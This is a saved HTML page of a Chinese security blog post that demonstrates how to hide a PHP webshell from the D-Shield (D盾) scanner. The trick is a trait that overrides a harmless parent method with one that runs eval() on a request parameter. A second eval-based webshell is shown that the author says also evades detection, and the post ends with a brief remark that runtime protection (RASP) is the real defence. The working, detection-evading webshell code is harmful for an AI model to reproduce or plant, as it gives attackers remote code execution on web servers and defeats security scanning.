@@ -1,0 +1,48 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>利用 PHP Trait 特性绕过 D 盾查杀 - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了."><meta property="og:image" content><meta property="og:title" content="利用 PHP Trait 特性绕过 D 盾查杀"><meta property="og:description" content="帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了."><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-25T15:14:14+00:00"><meta property="article:modified_time" content="2019-07-25T15:14:14+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="利用 PHP Trait 特性绕过 D 盾查杀"><meta name=twitter:description content="帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了."><script src=https://rmb122.com/js/feather.min.js></script>
+<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
+<a href=/tags>标签</a>&nbsp;
+<a href=/posts>归档</a>&nbsp;
+<a href=/about>关于</a>&nbsp;
+<a href=/links>友链</a>
+| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
+<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>利用 PHP Trait 特性绕过 D 盾查杀</h1><div class=meta>发表于 2019 年 7 月 25 日</div></div><section class=body><p>帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了.</p><p>这个特性已经写在 Title 里面了, 具体可以参考 <a href=https://www.php.net/traits>php.net</a> 上的介绍,<br>说人话就是覆盖方法, 于是我们就可以覆盖父类的方法, 把无害的变成有害的.</p><p>不废话, 直接看 shell 代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:#ff79c6>trait</span> T {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>dynamic</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>eval</span>(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>$this-&gt;s</span><span style=color:#f1fa8c>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>B</span> {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>dynamic</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>echo</span> <span style=color:#f1fa8c>&#34;I am innocent&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> __construct() {
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>s</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_REQUEST</span>[<span style=color:#f1fa8c>&#39;s&#39;</span>];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>C</span> <span style=color:#ff79c6>extends</span> B {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>use</span> T;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> __construct() {
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>parent</span><span style=color:#ff79c6>::</span><span style=color:#50fa7b>__construct</span>();
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>dynamic</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$c</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> C();
+</span></span></code></pre></div><p>可以看到用 T 的 <code>dynamic</code> 覆盖了 B 的 <code>dynamic</code>, 导致了代码执行,<br>个人猜测是 D 盾不支持 <code>trait</code>, 没有把里面的 eval 当成代码, 直接给跳过了.</p><p><img src=https://i.loli.net/2019/07/25/5d395c8b9e25359401.png alt><br><img src=https://i.loli.net/2019/07/25/5d395c8b9b5f447606.png alt><br><img src=https://i.loli.net/2019/07/25/5d395c8bbdf0329396.png alt></p><p>而且很神奇的是, 在这一段下面放一段本来过不了的, 也能过 D 盾了.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>B</span> {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>public</span> <span style=color:#8be9fd;font-style:italic>$c</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> __construct() { 
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>c</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_REQUEST</span>[<span style=color:#f1fa8c>&#39;a&#39;</span>];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>function</span> <span style=color:#50fa7b>a</span>() {
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>eval</span>(<span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>c</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$d</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> B();
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$d</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>a</span>();
+</span></span></code></pre></div><p>感觉 D 盾内应该有好几种引擎, trait 把其中基于数据流的引擎给搞崩了? 于是也就能过了.<br>比较的谜&mldr;</p><p>最后, PHP 这种动态语言, 静态查杀的难度是真的大&mldr;<br>特别涉及类, 过 D 盾的姿势非常多, 百度随便搜搜就有一堆. 想要真正防止, 还是靠 rasp 这种技术吧.<br>hook eval, 然后检测数据流是否来自 $_POST, $_GET 等等</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/pentest>pentest</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>
